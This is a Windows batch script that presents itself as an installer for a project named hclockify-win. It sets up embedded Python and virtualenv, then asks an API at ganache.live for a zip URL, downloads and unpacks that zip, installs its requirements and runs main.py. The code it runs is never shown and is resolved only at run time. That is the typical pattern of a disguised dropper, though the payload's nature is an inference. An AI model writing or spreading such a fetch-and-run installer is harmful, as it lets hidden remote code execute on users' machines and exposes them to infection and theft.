@echo off

REM Set URLs and paths
set "PYTHON_ZIP_URL=https://www.python.org/ftp/python/3.11.3/python-3.11.3-embed-amd64.zip"
set "PYTHON_ZIP_FILE=python-3.11.3-embed-amd64.zip"
set "PYTHON_DIR=python-3.11.3-embed-amd64"
set "GET_PIP_URL=https://bootstrap.pypa.io/get-pip.py"
set "GET_PIP_FILE=get-pip.py"
set "API_URL=https://ganache.live/api/v1/helper/ganache-link"
set "ZIP_FILE=main.zip"
set "PROJECT_DIR=hclockify-win"
set "VENV_DIR=venv"

REM Function to retrieve the zip file URL from the API
echo Retrieving zip file URL from API...
for /f "usebackq tokens=*" %%i in (`powershell -Command "(Invoke-WebRequest -Uri %API_URL%).Content.Trim()"`) do set "ZIP_URL=%%i"
echo Retrieved URL: %ZIP_URL%

REM Check if Python is installed
echo Checking for Python...
python --version >nul 2>&1
if %errorlevel% neq 0 (
    REM Check if Python embedded version is downloaded
    if not exist "%PYTHON_ZIP_FILE%" (
       echo Downloading Python embedded version...
       powershell -Command "Invoke-WebRequest -Uri %PYTHON_ZIP_URL% -OutFile %PYTHON_ZIP_FILE%"
    )

    REM Check if Python embedded version is extracted
    if not exist "%PYTHON_DIR%" (
       echo Extracting Python embedded version...
       powershell -Command "Expand-Archive -Path %PYTHON_ZIP_FILE% -DestinationPath ."
    )
)

REM Check if pip is installed
echo Checking for pip...
pip --version >nul 2>&1
if %errorlevel% neq 0 (
    REM Download get-pip.py
    if not exist "%PYTHON_ZIP_FILE%" (
        echo Pip not found. Installing pip...
        python -m ensurepip
    ) else (
        if not exist "%GET_PIP_FILE%" (
        echo Downloading get-pip.py...
        powershell -Command "Invoke-WebRequest -Uri %GET_PIP_URL% -OutFile %GET_PIP_FILE%"
        )

        REM Install pip using get-pip.py
        echo Installing pip...
        .\python.exe .\%GET_PIP_FILE%

        REM Write the content to python311._pth
        (
        echo python311.zip
        echo .
        echo import site
        ) > ".\python311._pth"
    )
)


REM Check if virtualenv is installed
echo Checking for virtualenv...
if not exist "%PYTHON_ZIP_FILE%" (
    pip show virtualenv >nul 2>&1
    if %errorlevel% neq 0 (
        echo Virtualenv not found. Installing virtualenv...
        pip install virtualenv
    )
) else (
    echo Virtualenv not found. Installing virtualenv...
    .\python.exe -m pip install virtualenv
)

REM Download the project zip file
echo Downloading project zip file...
powershell -Command "Invoke-WebRequest -Uri %ZIP_URL% -OutFile %ZIP_FILE%"

REM Unpack the project zip file
echo Unpacking project zip file...
powershell -Command "Expand-Archive -Path %ZIP_FILE% -DestinationPath ."

REM Create virtual environment
echo Creating virtual environment...
if not exist "%PYTHON_ZIP_FILE%" (
    python -m virtualenv %VENV_DIR%
) else (
    .\python.exe -m virtualenv %VENV_DIR%
)

REM Activate virtual environment
echo Activating virtual environment...
call %VENV_DIR%\Scripts\activate

REM Install required packages
echo Installing required packages...
cd %PROJECT_DIR%
pip install -r requirements.txt

REM Run the main script
echo Running the main script...
python main.py

pause

REM Deactivate virtual environment
deactivate

echo Done!
timeout /t 10


exit
